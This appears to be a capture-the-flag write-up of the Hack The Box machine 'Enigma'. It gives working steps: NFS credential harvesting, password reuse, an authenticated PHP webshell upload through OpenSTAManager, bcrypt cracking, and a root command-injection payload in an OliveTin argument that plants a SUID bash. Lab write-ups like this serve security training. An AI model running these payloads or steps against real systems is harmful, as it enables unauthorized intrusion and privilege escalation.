# Enigma — Writeup

| Field | Value |
|-------|-------|
| **Machine** | Enigma |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Released** | Active (ID 915) |
| **IP** | 10.129.239.191 (VPN `tun0`) |
| **Owned** | 2026-09-27 — User ✅ Root ✅ |
| **Time** | ~30 minutes |

**Attack path (TL;DR):**

```text
nmap → mail(Dovecot) + NFS + nginx vhosts
     → NFS world-readable share → New_Employee_Access.pdf → kevin mail creds
     → sarah ka mailbox (same password) → OpenSTAManager admin creds
     → OSM v2.9.8 CVE-2026-38751 module upload → www-data RCE
     → DB creds (config.inc.php) → haris bcrypt hash → john → "bestfriends"
     → su haris → user.txt
     → OliveTin (root) on 127.0.0.1:1337 — sirf non-root blocked (OUTPUT firewall)
     → haris se ConnectRPC API → Backup Database action → db_pass command injection
     → root → root.txt
```

---

## 1. Recon

```bash
htb machine spawn enigma
nmap -sC -sV -p- --min-rate 1500 -oA recon 10.129.239.191
```

| Port | Service | Notes |
|------|---------|-------|
| 22 | OpenSSH 9.6p1 | password auth **disabled** (publickey only) |
| 80 | nginx | 302 → `enigma.htb` (vhost!) |
| 110/143/993/995 | Dovecot POP3/IMAP | mail |
| 2049 + rpc | NFS | `showmount -e` |

```bash
echo "10.129.239.191 enigma.htb" >> /etc/hosts
showmount -e 10.129.239.191
# Export list: /srv/nfs/onboarding *
```

## 2. NFS → PDF → mail credentials

Share sabke liye khula hai. Container mein mount cap nahi thi (`CAP_SYS_ADMIN` chahiye) — **privileged sidecar** trick:

```bash
docker run -d --rm --network container:kali --privileged --name nfsdump \
  kalilinux/kali-rolling sleep 7200
docker exec nfsdump mount -t nfs -o nolock,vers=3,addr=10.129.239.191 \
  10.129.239.191:/srv/nfs/onboarding /mnt/x
docker exec nfsdump cat /mnt/x/New_Employee_Access.pdf > /tmp/
pdftotext /tmp/New_Employee_Access.pdf -
```

PDF (New Employee System Access):

```text
URL: http://mail001.enigma.htb
Username: kevin
Password: Enigma2024!
```

## 3. Mailbox hopping

```bash
echo "10.129.239.191 mail001.enigma.htb support_001.enigma.htb" >> /etc/hosts
```

- `mail001.enigma.htb` = **Roundcube** webmail (vhost)
- POP3 plain auth blocked → **IMAP SSL (993)** se login:

```python
M = imaplib.IMAP4_SSL('10.129.239.191', 993)
M.login('kevin', 'Enigma2024!')   # welcome mail — creds NFS se aayenge (done)
M.login('sarah', 'Enigma2024!')   # SAME password bhi chala!
```

Sarah ke inbox mein IT reply:

```text
URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
(OpenSTAManager — IT ticketing app)
```

> **Lesson:** ek service ke creds doosre users pe try karo — password reuse sabse common foothold hai.

## 4. OpenSTAManager → RCE (CVE-2026-38751)

```bash
curl http://support_001.enigma.htb/     # OpenSTAManager, app.min.css?v=2.9.8
```

**CVE-2026-38751**: version ≤ 2.10 mein **module update upload** → arbitrary PHP upload (authenticated admin). Steps:

```python
# 1. login
s.post(t + '/index.php?op=login', data={'username': 'admin', 'password': 'Ne3s4rtars78s'})
# 2. enable module updates
s.post(t + '/ajax.php?a=check_module_updates_settings', data={'Attiva aggiornamenti': '1'})
# 3. malicious module ZIP = shell/MODULE + shell/shell.php (webshell)
# 4. upload
s.post(t + '/modules/aggiornamenti/upload_modules.php', files={'blob': ('update.zip', zip_bytes)})
# 5. RCE
requests.get(t + '/modules/shell/shell.php', params={'c': 'id'})
# uid=33(www-data)
```

## 5. www-data → haris (john the ripper)

```bash
cat /var/www/html/openstamanager/config.inc.php
# $db_username = 'brollin'; $db_password = 'Fri3nds@9099';

mysql -ubrollin -p'Fri3nds@9099' openstamanager -N -e 'SELECT username,password FROM zz_users'
# admin   $2y$10$rTJV...
# haris   $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC

echo '$2y$10$WHf1...' > haris.hash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt haris.hash
# bestfriends   (2 seconds!)
```

`su` ko **TTY** chahiye — webshell se python `pty.fork()`:

```python
pid, fd = pty.fork()
if pid == 0:
    os.execvp('su', ['su', '-', 'haris', '-c', 'id; cat /home/haris/user.txt'])
else:
    time.sleep(0.8); os.write(fd, b'bestfriends\n')
```

```
ff4d8e92f6f456fcec6e70019cbdd97e   ← user flag
```

## 6. Root — OliveTin API + command injection

Recon se mila: **`/usr/local/bin/OliveTin` root process** (localhost:1337), config `/etc/OliveTin/config.yaml`:

```yaml
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  arguments:
    - {name: db_pass, type: password}   # FREE TEXT → single quotes ke andar!
```

**Blocker:** `127.0.0.1:1337` se **www-data** connect nahi karta (SYN drop — OUTPUT firewall by uid), par **haris** kar leta hai:

```bash
# www-data: 1337 FAIL, 3306 OK
# haris:    1337 OK  →  curl {"status":"OK"}
```

OliveTin = **ConnectRPC** (gRPC-JSON). Endpoint discover kiya (strings + probe):

```text
POST /api/olivetin.api.v1.OliveTinApiService/StartAction
Content-Type: application/json
Connect-Protocol-Version: 1
```

Request (proto: `binding_id` + `arguments[{name,value}]` — action_id nahi!):

```json
{
  "binding_id": "backup_database",
  "arguments": [
    {"name": "db_user", "value": "backup_svc"},
    {"name": "db_pass", "value": "x';cat /root/root.txt>/tmp/rflag;chmod 644 /tmp/rflag;cp /bin/bash /tmp/.rsh;chmod 4755 /tmp/.rsh;#"},
    {"name": "db_name", "value": "production"}
  ]
}
```

Command builds as (root chalta hai):

```bash
mysqldump -u backup_svc -p'x'; <PAYLOAD>; #' production > ...
#                     └ quote close  └ commands  └ comment
```

Result:

```bash
/tmp/.rsh -p -c 'id; cat /root/root.txt'
# euid=0(root)
# 7585bea1d4d3f2351354f5f67b5a935b   ← root flag
```

Cleanup: webshell + SUID bash + sidecar container delete.

---

## Key takeaways

1. **PDF/NFS/exports ko hamesha kholein** — onboarding docs mein credentials hote hain (IDOR/PCAP ke baad yeh teesra classic gift).
2. **Password reuse chain:** kevin = sarah (mail) → admin (OSM) → haris (system, john se crack). Ek hi password 4 jagah!
3. **`su` pipe se nahi chalta** — TTY chahiye (`python pty.fork` ya `script -qec`).
4. **App ka apna CVE dhundo:** version note kiya (2.9.8) → search → exact-fit exploit mila (module upload RCE).
5. **Localhost services bhi firewalled hote hain** — uid-based OUTPUT rules: `www-data` block, user allowed. Service *exist* karna = use *karne* ka proof.
6. **ConnectRPC/protobuf APIs** — `strings` se service/method nikalo, GitHub se `.proto` padho, field guess mat karo (`action_id` nahi, `binding_id` tha!).

## Tools used

`nmap` · `showmount` · docker sidecar mount · `pdftotext` · `imaplib` · `john` · python `pty` · `curl` (ConnectRPC) · `htb` CLI
